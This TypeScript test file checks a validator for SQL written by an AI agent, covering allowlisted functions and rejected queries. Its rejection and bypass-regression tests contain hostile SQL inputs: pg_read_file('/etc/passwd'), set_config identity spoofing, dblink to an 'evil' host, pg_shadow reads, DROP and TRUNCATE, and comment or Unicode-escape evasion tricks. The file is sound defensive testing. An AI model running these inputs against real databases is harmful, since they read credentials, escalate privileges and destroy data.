import { describe, expect, test } from "vitest";
import { validateAgentSql } from "./validate-agent-sql.ts";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Shorthand: asserts the SQL passes validation. */
async function accepts(sql: string): Promise<void> {
  await expect(validateAgentSql(sql)).resolves.toBeUndefined();
}

// ---------------------------------------------------------------------------
// Function allowlist coverage
// ---------------------------------------------------------------------------

describe("function allowlist", () => {
  const jsonbFunctions = [
    { name: "jsonb_array_elements", sql: "SELECT jsonb_array_elements(draft.data) FROM draft" },
    {
      name: "jsonb_array_elements_text",
      sql: "SELECT jsonb_array_elements_text(draft.data) FROM draft",
    },
    { name: "jsonb_array_length", sql: "SELECT jsonb_array_length(draft.data) FROM draft" },
    { name: "jsonb_build_object", sql: "SELECT jsonb_build_object('key', 'val') FROM draft" },
    { name: "jsonb_build_array", sql: "SELECT jsonb_build_array(1, 2, 3) FROM draft" },
    { name: "jsonb_set", sql: "SELECT jsonb_set(draft.data, '{key}', '\"val\"') FROM draft" },
    { name: "jsonb_set_lax", sql: "SELECT jsonb_set_lax(draft.data, '{key}', null) FROM draft" },
    { name: "jsonb_insert", sql: "SELECT jsonb_insert(draft.data, '{0}', '\"val\"') FROM draft" },
    {
      name: "jsonb_agg",
      sql: "SELECT jsonb_agg(elem) FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "jsonb_object_agg",
      sql: "SELECT jsonb_object_agg(elem->>'k', elem->>'v') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    { name: "jsonb_strip_nulls", sql: "SELECT jsonb_strip_nulls(draft.data) FROM draft" },
    { name: "jsonb_typeof", sql: "SELECT jsonb_typeof(draft.data) FROM draft" },
    { name: "jsonb_each", sql: "SELECT * FROM draft, jsonb_each(draft.data)" },
    { name: "jsonb_each_text", sql: "SELECT * FROM draft, jsonb_each_text(draft.data)" },
    { name: "jsonb_object_keys", sql: "SELECT jsonb_object_keys(draft.data) FROM draft" },
    { name: "jsonb_pretty", sql: "SELECT jsonb_pretty(draft.data) FROM draft" },
    {
      name: "jsonb_path_query",
      sql: "SELECT jsonb_path_query(draft.data, '$.items[*]') FROM draft",
    },
    {
      name: "jsonb_path_query_first",
      sql: "SELECT jsonb_path_query_first(draft.data, '$.name') FROM draft",
    },
    {
      name: "jsonb_path_query_array",
      sql: "SELECT jsonb_path_query_array(draft.data, '$.items[*]') FROM draft",
    },
    { name: "jsonb_path_exists", sql: "SELECT jsonb_path_exists(draft.data, '$.name') FROM draft" },
    {
      name: "jsonb_path_match",
      sql: "SELECT jsonb_path_match(draft.data, '$.active == true') FROM draft",
    },
    { name: "to_jsonb", sql: "SELECT to_jsonb(draft.data) FROM draft" },
  ] as const;

  test.each(jsonbFunctions)("accepts JSONB: $name", async ({ sql }) => {
    await accepts(sql);
  });

  const aggregateFunctions = [
    { name: "count", sql: "SELECT count(*) FROM draft" },
    {
      name: "sum",
      sql: "SELECT sum((elem->>'qty')::numeric) FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "avg",
      sql: "SELECT avg((elem->>'qty')::numeric) FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "min",
      sql: "SELECT min(elem->>'name') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "max",
      sql: "SELECT max(elem->>'name') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "array_agg",
      sql: "SELECT array_agg(elem->>'name') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "string_agg",
      sql: "SELECT string_agg(elem->>'name', ', ') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "bool_and",
      sql: "SELECT bool_and((elem->>'active')::boolean) FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "bool_or",
      sql: "SELECT bool_or((elem->>'active')::boolean) FROM draft, jsonb_array_elements(draft.data) elem",
    },
  ] as const;

  test.each(aggregateFunctions)("accepts Aggregate: $name", async ({ sql }) => {
    await accepts(sql);
  });

  const windowFunctions = [
    {
      name: "row_number",
      sql: "SELECT row_number() OVER (ORDER BY elem->>'name') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "rank",
      sql: "SELECT rank() OVER (ORDER BY elem->>'score') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "dense_rank",
      sql: "SELECT dense_rank() OVER (ORDER BY elem->>'score') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "lag",
      sql: "SELECT lag(elem->>'name') OVER (ORDER BY elem->>'id') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "lead",
      sql: "SELECT lead(elem->>'name') OVER (ORDER BY elem->>'id') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "ntile",
      sql: "SELECT ntile(4) OVER (ORDER BY elem->>'score') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "first_value",
      sql: "SELECT first_value(elem->>'name') OVER (ORDER BY elem->>'score') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "last_value",
      sql: "SELECT last_value(elem->>'name') OVER (ORDER BY elem->>'score') FROM draft, jsonb_array_elements(draft.data) elem",
    },
  ] as const;

  test.each(windowFunctions)("accepts Window: $name", async ({ sql }) => {
    await accepts(sql);
  });

  const stringFunctions = [
    {
      name: "lower",
      sql: "SELECT lower(elem->>'name') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "upper",
      sql: "SELECT upper(elem->>'name') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "length",
      sql: "SELECT length(elem->>'name') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "char_length",
      sql: "SELECT char_length(elem->>'name') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "btrim",
      sql: "SELECT btrim(elem->>'name') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "ltrim",
      sql: "SELECT ltrim(elem->>'name') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "rtrim",
      sql: "SELECT rtrim(elem->>'name') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "substring",
      sql: "SELECT substring(elem->>'name', 1, 3) FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "replace",
      sql: "SELECT replace(elem->>'name', 'old', 'new') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "regexp_replace",
      sql: "SELECT regexp_replace(elem->>'name', '\\d+', '', 'g') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "regexp_match",
      sql: "SELECT regexp_match(elem->>'name', '(\\w+)') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "starts_with",
      sql: "SELECT starts_with(elem->>'name', 'A') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "concat",
      sql: "SELECT concat(elem->>'first', ' ', elem->>'last') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "concat_ws",
      sql: "SELECT concat_ws(', ', elem->>'first', elem->>'last') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "format",
      sql: "SELECT format('Hello %s', elem->>'name') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "split_part",
      sql: "SELECT split_part(elem->>'email', '@', 2) FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "left",
      sql: "SELECT left(elem->>'name', 5) FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "right",
      sql: "SELECT right(elem->>'name', 3) FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "strpos",
      sql: "SELECT strpos(elem->>'name', 'x') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "reverse",
      sql: "SELECT reverse(elem->>'name') FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "position",
      sql: "SELECT position('x' in elem->>'name') FROM draft, jsonb_array_elements(draft.data) elem",
    },
  ] as const;

  test.each(stringFunctions)("accepts String: $name", async ({ sql }) => {
    await accepts(sql);
  });

  const mathFunctions = [
    {
      name: "abs",
      sql: "SELECT abs((elem->>'val')::numeric) FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "round",
      sql: "SELECT round((elem->>'val')::numeric, 2) FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "ceil",
      sql: "SELECT ceil((elem->>'val')::numeric) FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "ceiling",
      sql: "SELECT ceiling((elem->>'val')::numeric) FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "floor",
      sql: "SELECT floor((elem->>'val')::numeric) FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "trunc",
      sql: "SELECT trunc((elem->>'val')::numeric) FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "mod",
      sql: "SELECT mod((elem->>'val')::int, 3) FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "power",
      sql: "SELECT power((elem->>'val')::numeric, 2) FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      name: "sqrt",
      sql: "SELECT sqrt((elem->>'val')::numeric) FROM draft, jsonb_array_elements(draft.data) elem",
    },
    { name: "random", sql: "SELECT random() FROM draft" },
  ] as const;

  test.each(mathFunctions)("accepts Math: $name", async ({ sql }) => {
    await accepts(sql);
  });

  const dateFunctions = [
    { name: "now", sql: "SELECT now() FROM draft" },
    { name: "clock_timestamp", sql: "SELECT clock_timestamp() FROM draft" },
    { name: "date_trunc", sql: "SELECT date_trunc('month', now()) FROM draft" },
    { name: "date_part", sql: "SELECT date_part('year', now()) FROM draft" },
    { name: "extract", sql: "SELECT extract(year from now()) FROM draft" },
    { name: "age", sql: "SELECT age(now(), now()) FROM draft" },
    { name: "to_char", sql: "SELECT to_char(now(), 'YYYY-MM-DD') FROM draft" },
    { name: "to_number", sql: "SELECT to_number('123.45', '999.99') FROM draft" },
    { name: "to_date", sql: "SELECT to_date('2026-01-01', 'YYYY-MM-DD') FROM draft" },
    { name: "to_timestamp", sql: "SELECT to_timestamp('2026-01-01', 'YYYY-MM-DD') FROM draft" },
    { name: "make_date", sql: "SELECT make_date(2026, 1, 1) FROM draft" },
    { name: "make_interval", sql: "SELECT make_interval(days => 7) FROM draft" },
  ] as const;

  test.each(dateFunctions)("accepts Date/time: $name", async ({ sql }) => {
    await accepts(sql);
  });

  const arrayFunctions = [
    { name: "array_length", sql: "SELECT array_length(ARRAY[1,2,3], 1) FROM draft" },
    { name: "unnest", sql: "SELECT unnest(ARRAY[1,2,3]) FROM draft" },
    { name: "array_to_string", sql: "SELECT array_to_string(ARRAY['a','b'], ',') FROM draft" },
    { name: "cardinality", sql: "SELECT cardinality(ARRAY[1,2,3]) FROM draft" },
  ] as const;

  test.each(arrayFunctions)("accepts Array: $name", async ({ sql }) => {
    await accepts(sql);
  });
});

// ---------------------------------------------------------------------------
// Parser rewrites (syntax sugar → AST function name)
// ---------------------------------------------------------------------------

describe("parser rewrites", () => {
  test("trim(x) rewrites to pg_catalog.btrim", async () => {
    await accepts("SELECT trim(elem->>'name') FROM draft, jsonb_array_elements(draft.data) elem");
  });

  test("trim(leading ...) rewrites to pg_catalog.ltrim", async () => {
    await accepts(
      "SELECT trim(leading ' ' from elem->>'name') FROM draft, jsonb_array_elements(draft.data) elem",
    );
  });

  test("trim(trailing ...) rewrites to pg_catalog.rtrim", async () => {
    await accepts(
      "SELECT trim(trailing ' ' from elem->>'name') FROM draft, jsonb_array_elements(draft.data) elem",
    );
  });

  test("extract(year from ...) rewrites to pg_catalog.extract", async () => {
    await accepts("SELECT extract(year from now()) FROM draft");
  });

  test("position('x' in col) rewrites to pg_catalog.position", async () => {
    await accepts(
      "SELECT position('x' in elem->>'name') FROM draft, jsonb_array_elements(draft.data) elem",
    );
  });

  test("substring(col from N for M) rewrites to pg_catalog.substring", async () => {
    await accepts(
      "SELECT substring(elem->>'name' from 1 for 3) FROM draft, jsonb_array_elements(draft.data) elem",
    );
  });
});

// ---------------------------------------------------------------------------
// Non-FuncCall AST nodes (should pass without allowlist check)
// ---------------------------------------------------------------------------

describe("non-FuncCall AST nodes", () => {
  test("CASE WHEN", async () => {
    await accepts("SELECT CASE WHEN draft.data->>'active' = 'true' THEN 1 ELSE 0 END FROM draft");
  });

  test("COALESCE", async () => {
    await accepts("SELECT COALESCE(draft.data->>'name', 'unknown') FROM draft");
  });

  test("GREATEST", async () => {
    await accepts("SELECT GREATEST(1, 2, 3) FROM draft");
  });

  test("LEAST", async () => {
    await accepts("SELECT LEAST(1, 2, 3) FROM draft");
  });

  test("IS NULL", async () => {
    await accepts("SELECT * FROM draft WHERE draft.data->>'name' IS NULL");
  });

  test("IS NOT NULL", async () => {
    await accepts("SELECT * FROM draft WHERE draft.data->>'name' IS NOT NULL");
  });

  test("subquery", async () => {
    await accepts("SELECT (SELECT count(*) FROM draft) FROM draft");
  });

  test("JSONB operators (-> ->> || @>)", async () => {
    await accepts(
      "SELECT draft.data->'items', draft.data->>'name', draft.data || '{}'::jsonb FROM draft WHERE draft.data @> '{\"active\":true}'",
    );
  });

  test("BETWEEN", async () => {
    await accepts("SELECT * FROM draft WHERE (draft.data->>'score')::int BETWEEN 1 AND 100");
  });

  test("IN list", async () => {
    await accepts("SELECT * FROM draft WHERE draft.data->>'status' IN ('active', 'pending')");
  });

  test("LIKE", async () => {
    await accepts("SELECT * FROM draft WHERE draft.data->>'name' LIKE '%test%'");
  });

  test("DISTINCT", async () => {
    await accepts("SELECT DISTINCT draft.data->>'category' FROM draft");
  });

  test("ORDER BY and LIMIT", async () => {
    await accepts(
      "SELECT draft.data->>'name' FROM draft ORDER BY draft.data->>'name' LIMIT 10 OFFSET 5",
    );
  });
});

// ---------------------------------------------------------------------------
// Allowed SQLValueFunction
// ---------------------------------------------------------------------------

describe("allowed SQLValueFunction", () => {
  test("current_timestamp", async () => {
    await accepts("SELECT current_timestamp FROM draft");
  });

  test("current_date", async () => {
    await accepts("SELECT current_date FROM draft");
  });
});

// ---------------------------------------------------------------------------
// Allowed TypeCasts
// ---------------------------------------------------------------------------

describe("allowed type casts", () => {
  const safeCasts = [
    {
      type: "int",
      sql: "SELECT (elem->>'qty')::int FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      type: "integer",
      sql: "SELECT (elem->>'qty')::integer FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      type: "bigint",
      sql: "SELECT (elem->>'qty')::bigint FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      type: "smallint",
      sql: "SELECT (elem->>'qty')::smallint FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      type: "text",
      sql: "SELECT (elem->>'qty')::text FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      type: "varchar",
      sql: "SELECT (elem->>'name')::varchar FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      type: "char",
      sql: "SELECT (elem->>'code')::char(1) FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      type: "boolean",
      sql: "SELECT (elem->>'active')::boolean FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      type: "numeric",
      sql: "SELECT (elem->>'price')::numeric FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      type: "decimal",
      sql: "SELECT (elem->>'price')::decimal FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      type: "real",
      sql: "SELECT (elem->>'val')::real FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      type: "double precision",
      sql: "SELECT (elem->>'val')::double precision FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      type: "float",
      sql: "SELECT (elem->>'val')::float FROM draft, jsonb_array_elements(draft.data) elem",
    },
    { type: "jsonb", sql: "SELECT '[]'::jsonb FROM draft" },
    { type: "json", sql: "SELECT '[]'::json FROM draft" },
    {
      type: "timestamp",
      sql: "SELECT (elem->>'created')::timestamp FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      type: "timestamptz",
      sql: "SELECT (elem->>'created')::timestamptz FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      type: "date",
      sql: "SELECT (elem->>'created')::date FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      type: "time",
      sql: "SELECT (elem->>'time')::time FROM draft, jsonb_array_elements(draft.data) elem",
    },
    { type: "interval", sql: "SELECT '1 day'::interval FROM draft" },
    {
      type: "uuid",
      sql: "SELECT (elem->>'id')::uuid FROM draft, jsonb_array_elements(draft.data) elem",
    },
    {
      type: "bytea",
      sql: "SELECT (elem->>'data')::bytea FROM draft, jsonb_array_elements(draft.data) elem",
    },
  ] as const;

  test.each(safeCasts)("accepts ::$type", async ({ sql }) => {
    await accepts(sql);
  });
});

// ---------------------------------------------------------------------------
// CTE support
// ---------------------------------------------------------------------------

describe("CTEs", () => {
  test("non-recursive CTE", async () => {
    await accepts(
      "WITH items AS (SELECT jsonb_array_elements(draft.data) AS elem FROM draft) SELECT elem->>'name' FROM items",
    );
  });

  test("multiple CTEs", async () => {
    await accepts(`
			WITH
				items AS (SELECT jsonb_array_elements(draft.data) AS elem FROM draft),
				names AS (SELECT elem->>'name' AS name FROM items)
			SELECT * FROM names
		`);
  });

  test("CTE referencing draft in subquery", async () => {
    await accepts(
      "WITH filtered AS (SELECT * FROM draft WHERE draft.data->>'active' = 'true') SELECT * FROM filtered",
    );
  });

  test("rejects INSERT in CTE body", async () => {
    await rejects(
      "WITH poison AS (INSERT INTO draft(data) VALUES ('{}'::jsonb) RETURNING *) SELECT * FROM poison",
      /Only SELECT is allowed in CTEs/,
    );
  });

  test("rejects UPDATE in CTE body", async () => {
    await rejects(
      "WITH poison AS (UPDATE draft SET data = '{}'::jsonb RETURNING *) SELECT * FROM poison",
      /Only SELECT is allowed in CTEs/,
    );
  });

  test("rejects DELETE in CTE body", async () => {
    await rejects(
      "WITH poison AS (DELETE FROM draft RETURNING *) SELECT * FROM poison",
      /Only SELECT is allowed in CTEs/,
    );
  });

  test("rejects schema-qualified DML in CTE body", async () => {
    await rejects(
      "WITH poison AS (UPDATE public.resource_metadata SET name = 'evil' RETURNING *) SELECT * FROM poison",
      /Only SELECT is allowed in CTEs/,
    );
  });
});

// ---------------------------------------------------------------------------
// Real-world query patterns (from postgres-skill.ts and evals)
// ---------------------------------------------------------------------------

describe("real-world query patterns", () => {
  test("tabular read", async () => {
    await accepts(`
			SELECT elem->>'name' AS name,
			       (elem->>'quantity')::int AS qty
			FROM draft, jsonb_array_elements(draft.data) elem
		`);
  });

  test("filtered read", async () => {
    await accepts(`
			SELECT elem->>'name' AS name
			FROM draft, jsonb_array_elements(draft.data) elem
			WHERE (elem->>'quantity')::int > 2
		`);
  });

  test("aggregation", async () => {
    await accepts(`
			SELECT sum((elem->>'price')::numeric) AS total
			FROM draft, jsonb_array_elements(draft.data) elem
		`);
  });

  test("group by", async () => {
    await accepts(`
			SELECT elem->>'category' AS category, count(*) AS cnt
			FROM draft, jsonb_array_elements(draft.data) elem
			GROUP BY 1
		`);
  });

  test("append to array", async () => {
    await accepts(`
			SELECT draft.data || jsonb_build_array(
				jsonb_build_object('item', 'eggs', 'quantity', 12))
			FROM draft
		`);
  });

  test("conditional update", async () => {
    await accepts(`
			SELECT jsonb_agg(
				CASE WHEN elem->>'item' = 'eggs'
					THEN jsonb_set(elem, '{quantity}', '24')
					ELSE elem END)
			FROM draft, jsonb_array_elements(draft.data) elem
		`);
  });

  test("delete by filter", async () => {
    await accepts(`
			SELECT COALESCE(jsonb_agg(elem), '[]'::jsonb)
			FROM draft, jsonb_array_elements(draft.data) elem
			WHERE elem->>'category' != 'dairy'
		`);
  });

  test("prose replacement (parameterized)", async () => {
    await accepts("SELECT $1 FROM draft");
  });

  test("nested array operation with subquery", async () => {
    await accepts(`
			SELECT jsonb_set(draft.data, '{items}',
				(SELECT jsonb_agg(
					CASE WHEN item->>'name' = 'target'
						THEN jsonb_set(item, '{done}', 'true')
						ELSE item END)
				FROM jsonb_array_elements(draft.data->'items') item))
			FROM draft
		`);
  });

  test("document: append to nested array", async () => {
    await accepts(`
			SELECT jsonb_set(draft.data, '{action_items}',
				(draft.data->'action_items') || jsonb_build_array(
					jsonb_build_object('task', 'Review PR', 'assignee', 'Alice', 'done', false)))
			FROM draft
		`);
  });

  test("document: extract nested fields", async () => {
    await accepts(`
			SELECT item->>'task' AS task,
			       item->>'assignee' AS assignee
			FROM draft, jsonb_array_elements(draft.data->'action_items') item
			WHERE (item->>'done')::boolean = false
		`);
  });

  test("complex: aggregate with formatted output", async () => {
    await accepts(`
			SELECT jsonb_build_object(
				'total', count(*),
				'categories', jsonb_agg(DISTINCT elem->>'category'),
				'avg_price', round(avg((elem->>'price')::numeric), 2))
			FROM draft, jsonb_array_elements(draft.data) elem
		`);
  });
});

// ===========================================================================
// Rejection cases and bypass regression (Task #9)
// ===========================================================================

/** Shorthand: asserts the SQL is rejected with a matching error. */
async function rejects(sql: string, pattern?: RegExp): Promise<void> {
  await expect(validateAgentSql(sql)).rejects.toThrow(pattern);
}

// ---------------------------------------------------------------------------
// Stage 1 — Parse failures
// ---------------------------------------------------------------------------

describe("parse failures", () => {
  test("rejects unparseable SQL", async () => {
    await rejects("THIS IS NOT SQL AT ALL", /parse error/i);
  });

  test("rejects incomplete SQL", async () => {
    await rejects("SELECT * FROM", /parse error/i);
  });
});

// ---------------------------------------------------------------------------
// Stage 2 — Multi-statement rejection
// ---------------------------------------------------------------------------

describe("multi-statement rejection", () => {
  test("rejects two SELECTs", async () => {
    await rejects("SELECT 1; SELECT 2", /single|one.*statement|got 2/i);
  });

  test("rejects SELECT then RESET ROLE", async () => {
    await rejects("SELECT 1; RESET ROLE", /single|one.*statement|got 2/i);
  });

  test("rejects three statements", async () => {
    await rejects("SELECT 1; SELECT 2; SELECT 3", /single|one.*statement|got 3/i);
  });
});

// ---------------------------------------------------------------------------
// Stage 3 — Non-SELECT statement types
// ---------------------------------------------------------------------------

describe("non-SELECT statement types", () => {
  test.each([
    ["INSERT", "INSERT INTO draft VALUES (1)"],
    ["UPDATE", "UPDATE draft SET data = '{}'"],
    ["DELETE", "DELETE FROM draft"],
    ["SET", "SET LOCAL ROLE authenticated"],
    ["RESET", "RESET ROLE"],
    ["DO", "DO $$ BEGIN NULL; END $$"],
    ["CREATE", "CREATE TEMP TABLE evil (x int)"],
    ["DROP", "DROP TABLE IF EXISTS draft"],
    ["ALTER", "ALTER TABLE draft ADD COLUMN x TEXT"],
    ["COPY", "COPY draft TO STDOUT"],
    ["EXPLAIN", "EXPLAIN SELECT * FROM draft"],
    ["PREPARE", "PREPARE evil AS SELECT 1"],
    ["EXECUTE", "EXECUTE evil"],
    ["CALL", "CALL some_proc()"],
    ["GRANT", "GRANT SELECT ON draft TO PUBLIC"],
    ["REVOKE", "REVOKE ALL ON draft FROM agent_query"],
    ["TRUNCATE", "TRUNCATE draft"],
    ["SAVEPOINT", "SAVEPOINT sp1"],
    ["ROLLBACK", "ROLLBACK TO sp1"],
    ["DISCARD", "DISCARD ALL"],
    ["LISTEN", "LISTEN channel"],
    ["NOTIFY", "NOTIFY channel, 'msg'"],
  ])("rejects %s", async (_type, sql) => {
    await rejects(sql, /only select/i);
  });
});

// ---------------------------------------------------------------------------
// Stage 4 — Recursive CTE rejection
// ---------------------------------------------------------------------------

describe("recursive CTE rejection", () => {
  test("rejects WITH RECURSIVE", async () => {
    await rejects(
      "WITH RECURSIVE r AS (SELECT 1 UNION ALL SELECT 1 FROM r) SELECT count(*) FROM r",
      /recursive/i,
    );
  });
});

// ---------------------------------------------------------------------------
// Stage 5 — Unknown functions rejected with categorized error
// ---------------------------------------------------------------------------

describe("unknown functions rejected", () => {
  test.each([
    ["pg_read_file", "SELECT pg_read_file('/etc/passwd') FROM draft"],
    ["set_config", "SELECT set_config('request.user_id', 'hacker', true) FROM draft"],
    ["pg_sleep", "SELECT pg_sleep(100) FROM draft"],
    ["pg_advisory_lock", "SELECT pg_advisory_lock(1) FROM draft"],
    ["pg_notify", "SELECT pg_notify('chan', 'msg') FROM draft"],
    ["generate_series", "SELECT generate_series(1, 1000000)"],
    ["repeat", "SELECT repeat('x', 1000000) FROM draft"],
    ["lpad", "SELECT lpad('x', 1000000, 'y') FROM draft"],
    ["rpad", "SELECT rpad('x', 1000000, 'y') FROM draft"],
    ["version", "SELECT version() FROM draft"],
    ["inet_server_addr", "SELECT inet_server_addr() FROM draft"],
    ["current_setting", "SELECT current_setting('server_version') FROM draft"],
    ["current_database", "SELECT current_database() FROM draft"],
    ["dblink", "SELECT dblink('host=evil', 'SELECT 1') FROM draft"],
    ["pg_backend_pid", "SELECT pg_backend_pid() FROM draft"],
  ])("rejects %s", async (_name, sql) => {
    await rejects(sql, /not allowed/i);
  });

  test("error includes categorized function alternatives", async () => {
    try {
      await validateAgentSql("SELECT pg_sleep(1) FROM draft");
      expect.fail("should have thrown");
    } catch (err) {
      const msg = (err instanceof Error ? err : new Error(String(err))).message;
      expect(msg).toMatch(/pg_sleep/);
      expect(msg).toMatch(/JSONB/i);
      expect(msg).toMatch(/String/i);
      expect(msg).toMatch(/Math/i);
      expect(msg).toMatch(/Date/i);
    }
  });
});

// ---------------------------------------------------------------------------
// Stage 5 — Blocked SQLValueFunction ops (role/identity)
// ---------------------------------------------------------------------------

describe("blocked SQLValueFunction ops", () => {
  test("rejects current_user", async () => {
    await rejects("SELECT current_user FROM draft", /current_user|not allowed/i);
  });

  test("rejects session_user", async () => {
    await rejects("SELECT session_user FROM draft", /session_user|not allowed/i);
  });

  test("rejects current_role", async () => {
    await rejects("SELECT current_role FROM draft", /current_role|not allowed/i);
  });
});

// ---------------------------------------------------------------------------
// Stage 5 — Non-draft table references rejected
// ---------------------------------------------------------------------------

describe("non-draft table references rejected", () => {
  test.each([
    ["pg_class", "SELECT * FROM pg_class"],
    ["pg_roles", "SELECT * FROM pg_roles"],
    ["pg_stat_activity", "SELECT * FROM pg_stat_activity"],
    ["some_other_table", "SELECT * FROM some_other_table"],
    ["pg_user", "SELECT * FROM pg_user"],
    ["pg_shadow", "SELECT * FROM pg_shadow"],
    ["pg_auth_members", "SELECT * FROM pg_auth_members"],
    ["pg_settings", "SELECT * FROM pg_settings"],
  ])("rejects table: %s", async (_desc, sql) => {
    await rejects(sql, /not allowed|draft/i);
  });

  test("rejects information_schema.tables (schema-qualified)", async () => {
    await rejects(
      "SELECT * FROM information_schema.tables",
      /schema-qualified.*not allowed|information_schema/i,
    );
  });

  test("rejects public.resource_metadata (schema-qualified)", async () => {
    await rejects(
      "SELECT * FROM public.resource_metadata",
      /schema-qualified.*not allowed|public/i,
    );
  });
});

// ---------------------------------------------------------------------------
// Stage 6 — Schema-qualified function calls with non-pg_catalog schemas
// ---------------------------------------------------------------------------

describe("schema gate on function calls", () => {
  test("rejects public.evil()", async () => {
    await rejects("SELECT public.evil() FROM draft", /public.*not allowed|only pg_catalog/i);
  });

  test("rejects myschema.fn()", async () => {
    await rejects("SELECT myschema.fn() FROM draft", /myschema.*not allowed|only pg_catalog/i);
  });
});

// ---------------------------------------------------------------------------
// Stage 5 — Pseudo-type casts rejected
// ---------------------------------------------------------------------------

describe("pseudo-type casts rejected", () => {
  test.each([
    ["regclass", "SELECT 'pg_roles'::regclass FROM draft"],
    ["regtype", "SELECT 'int4'::regtype FROM draft"],
    ["regproc", "SELECT 'now'::regproc FROM draft"],
    ["regprocedure", "SELECT 'now()'::regprocedure FROM draft"],
    ["regnamespace", "SELECT 'public'::regnamespace FROM draft"],
    ["regrole", "SELECT 'postgres'::regrole FROM draft"],
  ])("rejects ::%s cast", async (_type, sql) => {
    await rejects(sql, /not allowed|pseudo-type|reg/i);
  });
});

// ---------------------------------------------------------------------------
// Bypass regression — structural attacks the regex denylist couldn't handle
// ---------------------------------------------------------------------------

describe("bypass regression", () => {
  test("comment injection: set_config with embedded comment", async () => {
    await rejects(
      "SELECT set_config/* */('request.user_id', 'x', true) FROM draft",
      /not allowed/i,
    );
  });

  test("dollar-quoting: DO block with set_config", async () => {
    await rejects(
      "DO $$BEGIN PERFORM set_config('request.user_id', 'hacker', true); END$$",
      /only select/i,
    );
  });

  test("case variation: mixed-case pg_sleep", async () => {
    await rejects("SeLeCt PG_SLEEP(100) FrOm draft", /not allowed/i);
  });

  test("Unicode escape identifiers: U& table reference", async () => {
    await rejects(`SELECT * FROM U&"\\0070g_roles"`, /not allowed|draft/i);
  });

  test("multi-statement: SELECT then RESET ROLE", async () => {
    await rejects("SELECT 1; RESET ROLE", /single|one.*statement|got 2/i);
  });

  test("DO single-quoted block body", async () => {
    await rejects("DO 'BEGIN RAISE NOTICE ''test''; END'", /only select/i);
  });

  test("dollar-tagged DO block", async () => {
    await rejects("DO $tag$SELECT pg_sleep(1)$tag$", /only select/i);
  });

  test("comment bypass: generate_series with block comment", async () => {
    await rejects("SELECT generate_series/* */(1, 100)", /not allowed/i);
  });

  test("comment bypass: pg_sleep with line comment", async () => {
    await rejects("SELECT pg_sleep-- comment\n(100) FROM draft", /not allowed/i);
  });
});

// ---------------------------------------------------------------------------
// Subquery recursion — AST walk must descend into subqueries
// ---------------------------------------------------------------------------

describe("subquery recursion", () => {
  test("rejects pg_sleep inside subquery", async () => {
    await rejects("SELECT (SELECT pg_sleep(1)) FROM draft", /not allowed/i);
  });

  test("accepts count(*) inside subquery", async () => {
    await accepts("SELECT (SELECT count(*) FROM draft) FROM draft");
  });

  test("rejects set_config inside CTE body", async () => {
    await rejects(
      "WITH cte AS (SELECT set_config('role', 'x', true)) SELECT * FROM cte",
      /not allowed/i,
    );
  });

  test("rejects disallowed table inside subquery", async () => {
